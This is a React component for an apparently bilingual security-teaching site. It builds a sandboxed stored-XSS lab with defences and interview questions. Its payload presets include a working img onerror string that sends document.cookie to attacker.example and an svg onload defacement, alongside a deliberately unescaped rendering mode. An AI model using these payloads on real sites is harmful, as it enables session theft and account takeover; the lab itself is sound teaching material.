import { useEffect, useMemo, useRef, useState } from 'react';
import { useLang } from '../i18n.jsx';
import DeepDive from '../components/DeepDive.jsx';
import SequenceDiagram from '../components/SequenceDiagram.jsx';
import { StepControls, useStepper } from '../components/Stepper.jsx';
import { Defenses, InterviewQs, Section, Seg, TopicShell } from '../components/TopicShell.jsx';

const NONCE = 'r4nd0m-n0nce';

const PAYLOADS = [
  { label: { en: 'Harmless HTML', zh: '无害 HTML' }, text: '<b>Great post!</b> Thanks for sharing.' },
  { label: '<script>alert()', text: "<script>alert('XSS by mallory')</script>" },
  {
    label: { en: 'Steal the cookie', zh: '偷 Cookie' },
    text: `<img src=x onerror="new Image().src='https://attacker.example/steal?c='+encodeURIComponent(document.cookie)">`,
  },
  {
    label: { en: 'Deface the page', zh: '篡改页面' },
    text: `<svg onload="document.body.innerHTML='<h1 style=&quot;color:#ff5d6c;font:700 28px monospace;padding:24px&quot;>💀 pwned by mallory</h1>'">`,
  },
];

const SEED = [
  { author: 'alice', text: 'Has anyone else had the campus Wi-Fi drop out during exams?' },
  { author: 'bob', text: 'Same here. Forgetting the network and reconnecting fixed it for me.' },
];

const escapeHtml = (s) =>
  s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');

const MODES = {
  vuln: {
    label: { en: 'Vulnerable', zh: '有漏洞' },
    render: (s) => s,
    csp: "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:",
    template: 'html += "<p>" + comment.text + "</p>";',
    explain: {
      en: 'The server pastes the comment straight into the HTML. The browser cannot tell the developer’s markup from the attacker’s, so any tag or event handler in the comment becomes part of the page.',
      zh: '服务器把评论原样拼进 HTML。浏览器分不清哪些标签是开发者写的、哪些是攻击者写的，所以评论里的标签和事件处理器都成了页面的一部分。',
    },
  },
  escape: {
    label: { en: 'Output encoding', zh: '输出编码' },
    render: escapeHtml,
    csp: "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:",
    template: 'html += "<p>" + escapeHtml(comment.text) + "</p>";',
    explain: {
      en: '< > & " \' are turned into HTML entities before they reach the page. The payload is displayed as text instead of being parsed as markup. This is the primary fix.',
      zh: '< > & " \' 在进入页面前被转成 HTML 实体。payload 只会被当成文字显示，不会被解析成标签。这是最主要的修复方式。',
    },
  },
  csp: {
    label: { en: 'Unescaped + CSP', zh: '未转义 + CSP' },
    render: (s) => s,
    csp: `default-src 'none'; script-src 'nonce-${NONCE}'; style-src 'unsafe-inline'; img-src data:`,
    template: `// still unescaped, but every response carries:\n// Content-Security-Policy: script-src 'nonce-${NONCE}'\nhtml += "<p>" + comment.text + "</p>";`,
    explain: {
      en: 'The bug is still there, but a strict Content Security Policy only lets scripts carrying the server’s random nonce run. Injected <script> tags and inline onerror handlers are refused. Defence in depth, not a replacement for encoding: the HTML itself is still injectable.',
      zh: '漏洞还在，但严格的内容安全策略（CSP）只允许带有服务器随机 nonce 的脚本运行。注入的 <script> 和内联 onerror 都会被拒绝。这是纵深防御，不能代替编码：HTML 本身仍然可以被注入。',
    },
  },
};

function buildPage(comments, modeKey) {
  const mode = MODES[modeKey];
  const body = comments
    .map(
      (c) =>
        `<div class="c"><div class="a">${escapeHtml(c.author)}</div><p>${c.author === 'mallory' ? mode.render(c.text) : escapeHtml(c.text)}</p></div>`,
    )
    .join('\n');
  return `<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${mode.csp}">
<script nonce="${NONCE}">
(function () {
  var send = function (type, detail) { parent.postMessage({ __htd: true, type: type, detail: String(detail) }, '*'); };
  Object.defineProperty(document, 'cookie', { configurable: true, get: function () { send('cookie', 'document.cookie'); return 'session=7f3a9c21e0; user=alice'; }, set: function () {} });
  window.alert = function (m) { send('alert', m); };
  var d = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
  Object.defineProperty(HTMLImageElement.prototype, 'src', { configurable: true, get: function () { return d.get.call(this); }, set: function (v) { if (/^https?:/i.test(v)) send('exfil', v); d.set.call(this, v); } });
  window.fetch = function (u) { send('exfil', u); return Promise.reject(new Error('blocked')); };
  document.addEventListener('securitypolicyviolation', function (e) { if (String(e.violatedDirective).indexOf('script-src') === 0) send('csp', e.violatedDirective); });
  var mo = new MutationObserver(function () { if (!document.querySelector('.c')) { send('deface', 'body replaced'); mo.disconnect(); } });
  document.addEventListener('DOMContentLoaded', function () { mo.observe(document.body, { childList: true, subtree: true }); });
})();
</script>
<style>
body{margin:0;font:14px/1.5 system-ui,sans-serif;background:#f6f7fb;color:#1b2033}
header{background:#2b3a67;color:#fff;padding:10px 14px;font-weight:600;display:flex;justify-content:space-between}
header span{font-weight:400;opacity:.8}
main{padding:12px 14px}
.c{background:#fff;border:1px solid #e3e6ef;border-radius:8px;padding:8px 12px;margin-bottom:8px}
.a{font-weight:700;color:#2b3a67;font-size:12px}
p{margin:2px 0 0;word-break:break-word}
</style></head><body>
<header>UniForum · #42 Campus Wi-Fi <span>signed in as alice</span></header>
<main>
${body}
</main></body></html>`;
}

const ACTORS = [
  { id: 'atk', label: { en: 'Mallory', zh: '攻击者 Mallory' }, sub: 'attacker', tone: 'red' },
  { id: 'srv', label: { en: 'Forum server', zh: '论坛服务器' }, sub: 'uniforum.example', tone: 'neutral' },
  { id: 'vic', label: { en: "Alice's browser", zh: 'Alice 的浏览器' }, sub: { en: 'logged in', zh: '已登录' }, tone: 'green' },
];

function flow(modeKey) {
  const blockedAt = modeKey === 'vuln' ? null : modeKey === 'escape' ? 3 : 4;
  const base = [
    {
      from: 'atk', to: 'srv', kind: 'attack',
      label: { en: 'POST /comment  <img onerror=…>', zh: 'POST /comment  <img onerror=…>' },
      note: { en: 'Mallory submits a comment that contains markup instead of plain text. Nothing stops her: to the server it is just a string.', zh: 'Mallory 提交了一条包含 HTML 标签而不是纯文本的评论。没人拦她：对服务器来说这只是一个字符串。' },
    },
    {
      from: 'srv', to: 'srv',
      label: { en: 'Store comment in DB', zh: '评论存入数据库' },
      note: { en: 'The payload is saved. This is what makes it stored (persistent) XSS: every future visitor of this thread will receive it.', zh: 'payload 被存了下来。这就是“存储型 XSS”：之后每个打开这个帖子的人都会收到它。' },
    },
    {
      from: 'vic', to: 'srv',
      label: { en: 'GET /thread/42  (Cookie: session)', zh: 'GET /thread/42 （带 Cookie）' },
      note: { en: 'Alice, who is logged in, opens the thread. Her browser sends her session cookie as usual.', zh: '已登录的 Alice 打开帖子，浏览器照常带上她的会话 Cookie。' },
    },
    {
      from: 'srv', to: 'vic', kind: blockedAt === 3 ? 'secure' : 'attack',
      label: blockedAt === 3 ? { en: 'HTML with &lt;img …&gt; (escaped)', zh: '已转义的 &lt;img …&gt;' } : { en: 'HTML with <img onerror=…>', zh: '包含 <img onerror=…> 的 HTML' },
      note:
        blockedAt === 3
          ? { en: 'Output encoding: the server sends &lt;img&gt; instead of <img>. Alice sees the payload as harmless text. The attack ends here.', zh: '输出编码：服务器发送的是 &lt;img&gt; 而不是 <img>。Alice 只会看到一段无害的文字，攻击到此结束。' }
          : { en: 'The server renders the stored comment into the page without encoding it. The attacker’s tag is now indistinguishable from the site’s own HTML.', zh: '服务器把存储的评论不经编码地渲染进页面。攻击者的标签和网站自己的 HTML 再也分不开了。' },
    },
    {
      from: 'vic', to: 'vic', kind: blockedAt === 4 ? 'blocked' : 'attack',
      label: blockedAt === 4 ? { en: 'CSP refuses inline script', zh: 'CSP 拒绝内联脚本' } : { en: 'Browser runs onerror handler', zh: '浏览器执行 onerror' },
      note:
        blockedAt === 4
          ? { en: 'The browser parses the <img>, but the Content-Security-Policy only allows scripts with the server’s nonce. The inline onerror handler is blocked and a violation is reported.', zh: '浏览器解析了 <img>，但 CSP 只允许带服务器 nonce 的脚本，内联 onerror 被拦下，并上报一次违规。' }
          : { en: 'The image fails to load, so onerror fires. The script runs with the full privileges of uniforum.example: it can read the DOM, cookies without HttpOnly, and make requests as Alice.', zh: '图片加载失败，于是 onerror 触发。脚本拥有 uniforum.example 的全部权限：读取 DOM、读取未设 HttpOnly 的 Cookie、以 Alice 的身份发请求。' },
    },
    {
      from: 'vic', to: 'atk', kind: 'attack',
      label: { en: 'GET attacker.example/steal?c=session…', zh: 'GET attacker.example/steal?c=session…' },
      note: { en: 'The script sends document.cookie to a server Mallory controls. Marking the cookie HttpOnly would have hidden it from JavaScript.', zh: '脚本把 document.cookie 发到 Mallory 控制的服务器。如果 Cookie 设置了 HttpOnly，JavaScript 根本读不到它。' },
    },
    {
      from: 'atk', to: 'srv', kind: 'attack',
      label: { en: 'Replay Cookie: session=7f3a…', zh: '重放 Cookie: session=7f3a…' },
      note: { en: 'Mallory pastes the stolen cookie into her own browser and is now logged in as Alice. Account takeover.', zh: 'Mallory 把偷到的 Cookie 放进自己的浏览器，现在她就是 Alice 了。账号被接管。' },
    },
  ];
  return blockedAt ? base.slice(0, blockedAt + 1) : base;
}

export default function Xss() {
  const { tr } = useLang();
  const [mode, setMode] = useState('vuln');
  const [draft, setDraft] = useState(PAYLOADS[2].text);
  const [comments, setComments] = useState(SEED);
  const [events, setEvents] = useState([]);
  const [rev, setRev] = useState(0);
  const frame = useRef(null);

  const srcDoc = useMemo(() => buildPage(comments, mode), [comments, mode, rev]); // eslint-disable-line react-hooks/exhaustive-deps
  const messages = useMemo(() => flow(mode), [mode]);
  const stepper = useStepper(messages.length);

  useEffect(() => setEvents([]), [srcDoc]);

  useEffect(() => {
    const onMsg = (e) => {
      if (!frame.current || e.source !== frame.current.contentWindow) return;
      if (!e.data || !e.data.__htd) return;
      setEvents((ev) => [...ev, { type: e.data.type, detail: e.data.detail, id: ev.length }]);
    };
    window.addEventListener('message', onMsg);
    return () => window.removeEventListener('message', onMsg);
  }, []);

  const post = () => {
    if (!draft.trim()) return;
    setComments((c) => [...c, { author: 'mallory', text: draft }]);
  };
  const lastMallory = [...comments].reverse().find((c) => c.author === 'mallory');

  const eventText = (ev) => {
    switch (ev.type) {
      case 'alert':
        return { icon: '⚠️', cls: 'bad', text: tr({ en: `alert() executed: "${ev.detail}"`, zh: `alert() 被执行："${ev.detail}"` }) };
      case 'cookie':
        return { icon: '🍪', cls: 'bad', text: tr({ en: 'Script read document.cookie', zh: '脚本读取了 document.cookie' }) };
      case 'exfil': {
        let shown = ev.detail;
        try {
          shown = decodeURIComponent(ev.detail);
        } catch {
          /* keep raw */
        }
        return { icon: '📤', cls: 'bad', text: tr({ en: `Exfiltration attempt → ${shown}`, zh: `外传数据 → ${shown}` }) };
      }
      case 'deface':
        return { icon: '💀', cls: 'bad', text: tr({ en: 'Page content replaced by the attacker', zh: '页面内容被攻击者替换' }) };
      case 'csp':
        return { icon: '🛡️', cls: 'good', text: tr({ en: `CSP blocked a script (${ev.detail})`, zh: `CSP 拦截了一段脚本（${ev.detail}）` }) };
      default:
        return { icon: '•', cls: '', text: ev.detail };
    }
  };

  return (
    <TopicShell
      id="xss"
      tldr={{
        en: 'XSS happens when a site puts attacker-controlled text into a page as HTML or JavaScript. The attacker’s code then runs in the victim’s browser, with the site’s own privileges.',
        zh: '当网站把攻击者可控的文本当作 HTML 或 JavaScript 放进页面时，就产生了 XSS。攻击者的代码会在受害者浏览器里，以该网站自己的权限运行。',
      }}
    >
      <Section kicker={{ en: 'Lab', zh: '实验' }} title={{ en: 'Attack a forum thread', zh: '攻击一个论坛帖子' }}>
        <div className="lab">
          <div className="panel">
            <Seg
              label={{ en: 'Server behaviour', zh: '服务器行为' }}
              value={mode}
              onChange={setMode}
              options={Object.entries(MODES).map(([value, m]) => ({ value, label: m.label }))}
            />
            <p className="hint">{tr(MODES[mode].explain)}</p>
            <div className="field-label">{tr({ en: 'Payloads', zh: 'Payload 预设' })}</div>
            <div className="chips">
              {PAYLOADS.map((p, i) => (
                <button key={i} className={`chip ${draft === p.text ? 'on' : ''}`} onClick={() => setDraft(p.text)}>
                  {tr(p.label)}
                </button>
              ))}
            </div>
            <label className="field-label" htmlFor="xss-input">
              {tr({ en: 'Your comment (as mallory)', zh: '你的评论（身份：mallory）' })}
            </label>
            <textarea id="xss-input" className="input mono" rows={4} value={draft} onChange={(e) => setDraft(e.target.value)} spellCheck={false} />
            <div className="row">
              <button className="btn danger" onClick={post}>
                {tr({ en: 'Post comment', zh: '发布评论' })}
              </button>
              <button className="btn ghost" onClick={() => setRev((r) => r + 1)}>
                ↻ {tr({ en: 'Reload page', zh: '重新加载' })}
              </button>
              <button className="btn ghost" onClick={() => setComments(SEED)}>
                {tr({ en: 'Reset thread', zh: '重置帖子' })}
              </button>
            </div>
            <div className="field-label">{tr({ en: 'Server template', zh: '服务器模板' })}</div>
            <pre className="code small">{MODES[mode].template}</pre>
            {lastMallory && (
              <>
                <div className="field-label">{tr({ en: 'HTML the server sends for your comment', zh: '服务器为你的评论输出的 HTML' })}</div>
                <pre className="code small">{`<p>${MODES[mode].render(lastMallory.text)}</p>`}</pre>
              </>
            )}
          </div>

          <div className="panel">
            <div className="browser">
              <div className="browser-bar">
                <span className="dots">
                  <i /> <i /> <i />
                </span>
                <span className="url">🔒 uniforum.example/thread/42</span>
              </div>
              <iframe ref={frame} title="Sandboxed vulnerable forum" sandbox="allow-scripts" srcDoc={srcDoc} />
            </div>
            <div className="console">
              <div className="console-head">
                <span>{tr({ en: 'Attacker console', zh: '攻击者控制台' })}</span>
                <span className="muted">{tr({ en: 'what the injected code managed to do', zh: '注入的代码做成了什么' })}</span>
              </div>
              {events.length === 0 ? (
                <div className="console-empty">{tr({ en: 'Nothing yet. Post a payload.', zh: '暂无动静，发一个 payload 试试。' })}</div>
              ) : (
                events.map((ev) => {
                  const e = eventText(ev);
                  return (
                    <div key={ev.id} className={`console-line ${e.cls}`}>
                      <span>{e.icon}</span> {e.text}
                    </div>
                  );
                })
              )}
            </div>
            <p className="tiny muted">
              {tr({
                en: 'The forum runs in a sandboxed iframe with a unique origin. alert, cookies and outgoing requests are stubbed, and its own CSP blocks all real network access.',
                zh: '论坛运行在拥有独立源的沙箱 iframe 中。alert、Cookie 和外发请求都被替换成了桩函数，它自己的 CSP 还阻止了所有真实网络访问。',
              })}
            </p>
          </div>
        </div>
      </Section>

      <Section kicker={{ en: 'Trace', zh: '追踪' }} title={{ en: 'How stored XSS becomes account takeover', zh: '存储型 XSS 如何变成账号接管' }}>
        <p className="muted">{tr({ en: 'The diagram follows the defence you picked above.', zh: '下图会跟随你在上面选择的防御方式变化。' })}</p>
        <SequenceDiagram actors={ACTORS} messages={messages} step={stepper.step} onSelect={stepper.go} title={{ en: 'Stored XSS sequence', zh: '存储型 XSS 时序图' }} />
        <StepControls stepper={stepper} messages={messages} />
      </Section>

      <DeepDive id="xss" />

      <Section kicker={{ en: 'Defend', zh: '防御' }} title={{ en: 'Defences that actually work', zh: '真正有效的防御' }}>
        <Defenses
          items={[
            { title: { en: 'Context-aware output encoding', zh: '按上下文输出编码' }, body: { en: 'Encode for the exact place data lands: HTML body, attribute, URL, or JS string. Templating engines like React, Jinja2 and Razor do this by default; dangerouslySetInnerHTML, |safe and Html.Raw opt out.', zh: '按数据所在的位置编码：HTML 正文、属性、URL 或 JS 字符串。React、Jinja2、Razor 等模板默认会编码；dangerouslySetInnerHTML、|safe、Html.Raw 则会关掉它。' } },
            { title: { en: 'Sanitise when you must allow HTML', zh: '必须允许 HTML 时做净化' }, body: { en: 'For rich text, use a maintained allow-list sanitiser such as DOMPurify. Never write your own regex filter.', zh: '富文本场景用维护良好的白名单净化库，比如 DOMPurify。不要自己写正则过滤。' } },
            { title: { en: 'Strict CSP', zh: '严格的 CSP' }, body: { en: "Nonce- or hash-based script-src with 'strict-dynamic' and no 'unsafe-inline'. It turns most XSS bugs into non-exploitable ones.", zh: "使用基于 nonce 或 hash 的 script-src，加上 'strict-dynamic'，不要 'unsafe-inline'。能让大多数 XSS 漏洞无法被利用。" } },
            { title: { en: 'HttpOnly, Secure, SameSite cookies', zh: 'HttpOnly、Secure、SameSite Cookie' }, body: { en: 'HttpOnly keeps session cookies out of document.cookie, which removes the easiest payoff, but injected script can still act as the user.', zh: 'HttpOnly 让会话 Cookie 不出现在 document.cookie 里，拿走了最容易的收益，但注入的脚本仍然能以用户身份行事。' } },
          ]}
        />
      </Section>

      <Section kicker={{ en: 'Interview prep', zh: '面试准备' }} title={{ en: 'Questions you might get', zh: '可能被问到的问题' }}>
        <InterviewQs
          items={[
            { q: { en: 'Why does <script> inserted via innerHTML not run, while <img onerror> does?', zh: '为什么用 innerHTML 插入的 <script> 不会执行，而 <img onerror> 会？' }, a: { en: 'The HTML spec marks scripts inserted through innerHTML as "already started", so they never execute. Event-handler attributes are not scripts elements; they fire when the event happens. That is why real payloads use onerror/onload. In this lab the comment is rendered server-side, so <script> does run.', zh: 'HTML 规范规定通过 innerHTML 插入的 script 被标记为“已开始”，所以永远不会执行。而事件处理属性不是 script 元素，事件发生时就会触发。这就是为什么真实 payload 常用 onerror/onload。本实验的评论是在服务器端渲染的，所以 <script> 会执行。' } },
            { q: { en: 'Is input validation enough to prevent XSS?', zh: '只做输入校验能防住 XSS 吗？' }, a: { en: 'No. Validation helps, but the same data can be safe in one context and dangerous in another. The reliable fix is encoding at output, for the specific context, plus CSP as a safety net.', zh: '不能。校验有帮助，但同一份数据在一个上下文里安全，换个上下文就可能危险。可靠的做法是在输出时按具体上下文编码，再用 CSP 兜底。' } },
            { q: { en: 'If cookies are HttpOnly, is XSS still serious?', zh: '如果 Cookie 设置了 HttpOnly，XSS 还严重吗？' }, a: { en: 'Yes. The script cannot read the cookie, but it runs on the origin, so it can send authenticated requests, read CSRF tokens and page data, log keystrokes, or show a fake login form.', zh: '依然严重。脚本读不到 Cookie，但它运行在该源上，可以发带身份的请求、读取 CSRF Token 和页面数据、记录键盘输入，或者弹出伪造的登录框。' } },
          ]}
        />
      </Section>
    </TopicShell>
  );
}
